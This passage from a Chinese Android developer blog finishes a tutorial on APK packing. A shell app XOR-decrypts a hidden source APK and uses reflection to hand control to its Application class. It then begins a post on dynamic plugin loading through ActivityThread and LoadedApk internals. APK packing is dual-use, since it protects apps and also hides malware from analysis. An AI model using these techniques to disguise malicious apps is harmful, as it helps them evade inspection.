C) 解密源程序APK  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接返回数据，读者可以添加自己解密方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] srcdata) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;srcdata.length;i++)&#123;</span><br><span class="line">        srcdata[i] = (<span class="keyword">byte</span>)(<span class="number">0xFF</span> ^ srcdata[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> srcdata;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>找到源程序的Application程序，让其运行  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//loadResources(apkFileName);</span></span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;onCreate&quot;</span>);</span><br><span class="line">        <span class="comment">// 如果源应用配置有Appliction对象，则替换为源应用Applicaiton，以便不影响源程序逻辑。</span></span><br><span class="line">        String appClassName = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ApplicationInfo ai = <span class="keyword">this</span>.getPackageManager()</span><br><span class="line">                    .getApplicationInfo(<span class="keyword">this</span>.getPackageName(),</span><br><span class="line">                            PackageManager.GET_META_DATA);</span><br><span class="line">            Bundle bundle = ai.metaData;</span><br><span class="line">            <span class="keyword">if</span> (bundle != <span class="keyword">null</span> &amp;&amp; bundle.containsKey(<span class="string">&quot;APPLICATION_CLASS_NAME&quot;</span>)) &#123;</span><br><span class="line">                appClassName = bundle.getString(<span class="string">&quot;APPLICATION_CLASS_NAME&quot;</span>);<span class="comment">//className 是配置在xml文件中的。</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;have no application class name&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NameNotFoundException e) &#123;</span><br><span class="line">            Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;error:&quot;</span>+Log.getStackTraceString(e));</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//有值的话调用该Applicaiton</span></span><br><span class="line">        Object currentActivityThread = RefInvoke.invokeStaticMethod(</span><br><span class="line">                <span class="string">&quot;android.app.ActivityThread&quot;</span>, <span class="string">&quot;currentActivityThread&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;&#125;, <span class="keyword">new</span> Object[] &#123;&#125;);</span><br><span class="line">        Object mBoundApplication = RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,</span><br><span class="line">                <span class="string">&quot;mBoundApplication&quot;</span>);</span><br><span class="line">        Object loadedApkInfo = RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">&quot;android.app.ActivityThread$AppBindData&quot;</span>,</span><br><span class="line">                mBoundApplication, <span class="string">&quot;info&quot;</span>);</span><br><span class="line">        <span class="comment">//把当前进程的mApplication 设置成了null</span></span><br><span class="line">        RefInvoke.setFieldOjbect(<span class="string">&quot;android.app.LoadedApk&quot;</span>, <span class="string">&quot;mApplication&quot;</span>,</span><br><span class="line">                loadedApkInfo, <span class="keyword">null</span>);</span><br><span class="line">        Object oldApplication = RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,</span><br><span class="line">                <span class="string">&quot;mInitialApplication&quot;</span>);</span><br><span class="line">        <span class="comment">//http://www.codeceo.com/article/android-context.html</span></span><br><span class="line">        ArrayList&lt;Application&gt; mAllApplications = (ArrayList&lt;Application&gt;) RefInvoke</span><br><span class="line">                .getFieldOjbect(<span class="string">&quot;android.app.ActivityThread&quot;</span>,</span><br><span class="line">                        currentActivityThread, <span class="string">&quot;mAllApplications&quot;</span>);</span><br><span class="line">        mAllApplications.remove(oldApplication); <span class="comment">// 删除oldApplication</span></span><br><span class="line">        </span><br><span class="line">        ApplicationInfo appinfo_In_LoadedApk = (ApplicationInfo) RefInvoke</span><br><span class="line">                .getFieldOjbect(<span class="string">&quot;android.app.LoadedApk&quot;</span>, loadedApkInfo,</span><br><span class="line">                        <span class="string">&quot;mApplicationInfo&quot;</span>);</span><br><span class="line">        ApplicationInfo appinfo_In_AppBindData = (ApplicationInfo) RefInvoke</span><br><span class="line">                .getFieldOjbect(<span class="string">&quot;android.app.ActivityThread$AppBindData&quot;</span>,</span><br><span class="line">                        mBoundApplication, <span class="string">&quot;appInfo&quot;</span>);</span><br><span class="line">        appinfo_In_LoadedApk.className = appClassName;</span><br><span class="line">        appinfo_In_AppBindData.className = appClassName;</span><br><span class="line">        Application app = (Application) RefInvoke.invokeMethod(</span><br><span class="line">                <span class="string">&quot;android.app.LoadedApk&quot;</span>, <span class="string">&quot;makeApplication&quot;</span>, loadedApkInfo,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123; <span class="keyword">boolean</span>.class, Instrumentation.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123; <span class="keyword">false</span>, <span class="keyword">null</span> &#125;); <span class="comment">// 执行 makeApplication（false,null）</span></span><br><span class="line">        RefInvoke.setFieldOjbect(<span class="string">&quot;android.app.ActivityThread&quot;</span>,</span><br><span class="line">                <span class="string">&quot;mInitialApplication&quot;</span>, currentActivityThread, app);</span><br><span class="line"></span><br><span class="line">        ArrayMap mProviderMap = (ArrayMap) RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,</span><br><span class="line">                <span class="string">&quot;mProviderMap&quot;</span>);</span><br><span class="line">        Iterator it = mProviderMap.values().iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            Object providerClientRecord = it.next();</span><br><span class="line">            Object localProvider = RefInvoke.getFieldOjbect(</span><br><span class="line">                    <span class="string">&quot;android.app.ActivityThread$ProviderClientRecord&quot;</span>,</span><br><span class="line">                    providerClientRecord, <span class="string">&quot;mLocalProvider&quot;</span>);</span><br><span class="line">            RefInvoke.setFieldOjbect(<span class="string">&quot;android.content.ContentProvider&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;mContext&quot;</span>, localProvider, app);</span><br><span class="line">        &#125;</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;app:&quot;</span>+app);</span><br><span class="line">        app.onCreate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
直接在壳程序的Application中的onCreate方法中进行就可以了。这里还可以看到是通过AndroidManifest.xml中的meta标签获取源程序APK中的Application对象的。<br>下面来看一下AndroidManifest.xml文件中的内容：  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:icon</span>=<span class="string">&quot;@drawable/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;com.example.packapk.ProxyApplication&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;APPLICATION_CLASS_NAME&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;com.example.sourceapk.MyApplication&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
这里我们定义了源程序APK的Application类名。<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1hsjW6HI">项目下载</a></li>
</ol>
<h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><p>下面就看看程序的运行步骤：</p>
<ul>
<li>第一步：得到源程序APK文件和壳程序的DEX文件<br>运行源程序和壳程序项目，之后得到这两个文件（将壳程序的classes.dex文件改名为SourceApk.dex），然后使用加密工具进行加壳。</li>
<li>第二步：替换壳程序中的classes.dex文件<br>我们在第一步中得到加壳之后的classes.dex文件之后，将其与PackApk.apk中的原classes.dex文件替换。</li>
<li>第三步：在第二步的时候得到替换之后的PackApk.apk文件，这个文件因为被修改了，所以我们需要重新对它签名，不然运行也是报错的。<br>签名之后的文件就可以运行了，效果如下：<br><img src="/images/packedapk/result.png"></li>
</ul>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/jiangwei0910410003/article/details/48415225/">http://blog.csdn.net/jiangwei0910410003/article/details/48415225/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/08/26/Android%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E4%B9%8B%E5%85%8D%E5%AE%89%E8%A3%85%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/08/26/Android%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E4%B9%8B%E5%85%8D%E5%AE%89%E8%A3%85%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/" class="post-title-link" itemprop="url">Android动态加载之免安装运行程序</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-08-26 10:50:42" itemprop="dateCreated datePublished" datetime="2016-08-26T10:50:42+08:00">2016-08-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文说的关于动态加载的内容与之前一篇<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/08/22/Android%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E4%B9%8B%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/">Android动态加载之插件开发</a>有关系，本文要说的加载有两种：</p>
<ul>
<li>使用反射机制修改类加载器</li>
<li>使用代理的方式</li>
</ul>
<p>这两种方式都由各自的优缺点。</p>
<h2 id="技术介绍"><a href="#技术介绍" class="headerlink" title="技术介绍"></a>技术介绍</h2><h3 id="使用反射机制修改类加载器来实现动态加载Activity"><a href="#使用反射机制修改类加载器来实现动态加载Activity" class="headerlink" title="使用反射机制修改类加载器来实现动态加载Activity"></a>使用反射机制修改类加载器来实现动态加载Activity</h3><p>我们知道PathClassLoader是一个应用的默认加载器(而且它只能加载data/app/xxx.apk的文件)，但是我们加载插件一般使用DexClassLoader加载器，所以开始的时候，每个人都会很容易想到使用DexClassLoader来加载Activity获取到class对象，再使用Intent启动。但是实际上并不是想象的这么简单。<strong>因为Android中的四大组件都有一个特点就是他们有自己的启动流程和生命周期，我们使用DexClassLoader加载进来的Activity是不会涉及到任何启动流程和生命周期的概念，说白了，他就是一个普普通通的类。所以启动肯定会出错。</strong><br>解决这个问题有两种思路：<br><strong>思路1：替换LoadedApk中的mClassLoader</strong><br>只要让加载进来的Activity有启动流程和生命周期就行了，所以这里需要看一下一个Activity的启动过程，当然不会详细介绍一个Activity启动过程的。可以将使用的DexClassLoader加载器绑定到系统加载Activity的类加载器上，这个是最重要的突破点。下面我们就来通过源码看看如何找到加载Activity的类加载器。<br><strong>在找关于一个Apk或是Activity相关信息的时候，特别是启动流程的时候，肯定先找ActivityThread类，这个类很重要，也是关键突破口，它内部有很多的信息。</strong><br>看一下ActivityThread.java的源码。<br><strong>代码清单</strong> /frameworks/base/core/java/android/app/ActivityThread.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">// set of instantiated backup agents, keyed by package name</span></span><br><span class="line"><span class="keyword">final</span> ArrayMap&lt;String, BackupAgent&gt; mBackupAgents = <span class="keyword">new</span> ArrayMap&lt;String, BackupAgent&gt;();</span><br><span class="line"><span class="comment">/** Reference to singleton &#123;<span class="doctag">@link</span> ActivityThread&#125; */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ActivityThread sCurrentActivityThread; <span class="comment">// 获取到对象</span></span><br><span class="line">Instrumentation mInstrumentation;</span><br><span class="line">String mInstrumentationAppDir = <span class="keyword">null</span>;</span><br><span class="line">String mInstrumentationAppLibraryDir = <span class="keyword">null</span>;</span><br><span class="line">String mInstrumentationAppPackage = <span class="keyword">null</span>;</span><br><span class="line">String mInstrumentedAppDir = <span class="keyword">null</span>;</span><br><span class="line">String mInstrumentedAppLibraryDir = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">boolean</span> mSystemThread = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">boolean</span> mJitEnabled = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// These can be accessed by multiple threads; mPackages is the lock.</span></span><br><span class="line"><span class="comment">// XXX For now we keep around information about all packages we have</span></span><br><span class="line"><span class="comment">// seen, not removing entries from this map.</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> The activity and window managers need to call in to</span></span><br><span class="line"><span class="comment">// ActivityThread to do things like update resource configurations,</span></span><br><span class="line"><span class="comment">// which means this lock gets held while the activity and window managers</span></span><br><span class="line"><span class="comment">// holds their own lock.  Thus you MUST NEVER call back into the activity manager</span></span><br><span class="line"><span class="comment">// or window manager or anything that depends on them while holding this lock.</span></span><br><span class="line"><span class="keyword">final</span> ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt; mPackages</span><br><span class="line">        = <span class="keyword">new</span> ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt;(); <span class="comment">// 获取到LoadedApk对象</span></span><br><span class="line"><span class="keyword">final</span> ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt; mResourcePackages</span><br><span class="line">        = <span class="keyword">new</span> ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt;();</span><br><span class="line"><span class="keyword">final</span> ArrayList&lt;ActivityClientRecord&gt; mRelaunchingActivities</span><br><span class="line">        = <span class="keyword">new</span> ArrayList&lt;ActivityClientRecord&gt;();</span><br><span class="line">Configuration mPendingConfiguration = <span class="keyword">null</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>我们看到ActivityThread类中有一个自己的static对象，然后还有一个ArrayMap存放Apk包名和LoadedApk映射关系的数据结构。<br>LoadedApk.java是加载Activity的时候一个很重要的类，这个类是负责加载一个Apk程序的，我们可以看一下它的源码：<br><strong>代码清单</strong> /frameworks/base/core/java/android/app/LoadedApk.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Local state maintained about a currently loaded .apk.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@hide</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">LoadedApk</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">&quot;LoadedApk&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ActivityThread mActivityThread;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ApplicationInfo mApplicationInfo;</span><br><span class="line">    <span class="keyword">final</span> String mPackageName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String mAppDir;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String mResDir;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String[] mSharedLibraries;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String mDataDir;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String mLibDir;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> File mDataDirFile;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader mBaseClassLoader;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> mSecurityViolation;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> mIncludeCode;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DisplayAdjustments mDisplayAdjustments = <span class="keyword">new</span> DisplayAdjustments();</span><br><span class="line">    Resources mResources;</span><br><span class="line">    <span class="keyword">private</span> ClassLoader mClassLoader; <span class="comment">// 一个Apk加载的类加载器</span></span><br><span class="line">    <span class="keyword">private</span> Application mApplication;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayMap&lt;Context, ArrayMap&lt;BroadcastReceiver, ReceiverDispatcher&gt;&gt; mReceivers</span><br><span class="line">        = <span class="keyword">new</span> ArrayMap&lt;Context, ArrayMap&lt;BroadcastReceiver, LoadedApk.ReceiverDispatcher&gt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayMap&lt;Context, ArrayMap&lt;BroadcastReceiver, LoadedApk.ReceiverDispatcher&gt;&gt; mUnregisteredReceivers</span><br><span class="line">        = <span class="keyword">new</span> ArrayMap&lt;Context, ArrayMap&lt;BroadcastReceiver, LoadedApk.ReceiverDispatcher&gt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayMap&lt;Context, ArrayMap&lt;ServiceConnection, LoadedApk.ServiceDispatcher&gt;&gt; mServices</span><br><span class="line">        = <span class="keyword">new</span> ArrayMap&lt;Context, ArrayMap&lt;ServiceConnection, LoadedApk.ServiceDispatcher&gt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayMap&lt;Context, ArrayMap&lt;ServiceConnection, LoadedApk.ServiceDispatcher&gt;&gt; mUnboundServices</span><br><span class="line">        = <span class="keyword">new</span> ArrayMap&lt;Context, ArrayMap&lt;ServiceConnection, LoadedApk.ServiceDispatcher&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> mClientCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Application <span class="title">getApplication</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mApplication;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>我们可以看到它内部有一个mClassLoader变量，就是负责加载一个Apk程序的，所以只要获取到这个类加载器就可以了。mClassLoader变量不是static的，所以我们还得获取一个LoadedApk对象。</p>
<blockquote>
<p>关于ActivityThread类为何如此重要，我们可以看看它的源码：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    SamplingProfilerIntegration.start();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CloseGuard defaults to true and can be quite spammy.  We</span></span><br><span class="line">    <span class="comment">// disable it here, but selectively enable it later (via</span></span><br><span class="line">    <span class="comment">// StrictMode) on debug builds, but using DropBox, not logs.</span></span><br><span class="line">    CloseGuard.setEnabled(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    Environment.initForCurrentUser();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the reporter for event logging in libcore</span></span><br><span class="line">    EventLogger.setReporter(<span class="keyword">new</span> EventLoggingReporter());</span><br><span class="line"></span><br><span class="line">    Security.addProvider(<span class="keyword">new</span> AndroidKeyStoreProvider());</span><br><span class="line"></span><br><span class="line">    Process.setArgV0(<span class="string">&quot;&lt;pre-initialized&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Looper.prepareMainLooper();</span><br><span class="line"></span><br><span class="line">    ActivityThread thread = <span class="keyword">new</span> ActivityThread();</span><br><span class="line">    thread.attach(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sMainThreadHandler == <span class="keyword">null</span>) &#123;</span><br><span class="line">        sMainThreadHandler = thread.getHandler();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AsyncTask.init();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span>) &#123;</span><br><span class="line">        Looper.myLooper().setMessageLogging(<span class="keyword">new</span></span><br><span class="line">                LogPrinter(Log.DEBUG, <span class="string">&quot;ActivityThread&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>它有Java程序运行的入口main方法，所有的APP程序的执行入口就是这里。<br>回到主干上来，我们现在开始编写代码实现反射获取mClassLoader类，然后将其替换成我们的DexClassLoader类，看一下项目结构：</p>
<ul>
<li>PluginActivity —— 插件项目</li>
<li>DynamicActivityForClassLoader —— 宿主项目</li>
</ul>
<p>PluginActivity项目很简单，就一个Activity：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.dynamicactivityapk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> View parentView;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">if</span>(parentView == <span class="keyword">null</span>) &#123;</span><br><span class="line">            setContentView(R.layout.activity_main);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setContentView(parentView);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        findViewById(R.id.btn).setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg0)</span> </span>&#123;</span><br><span class="line">                Toast.makeText(getApplicationContext(), <span class="string">&quot;I came from plugin~~&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">            &#125;&#125;);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setLayoutView</span><span class="params">(View view)</span></span>&#123;</span><br><span class="line">        parentView = view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译PluginActivity项目：<br><img src="/images/dynamicload/pluginactivity.png"><br>下面看一下宿主项目，宿主项目其实最大的功能就是加载上面的PluginActivity.apk，然后启动内部的MainActivity就可以了，这里的核心代码就是如何通过反射替换系统的mClassLoader类：  </p>
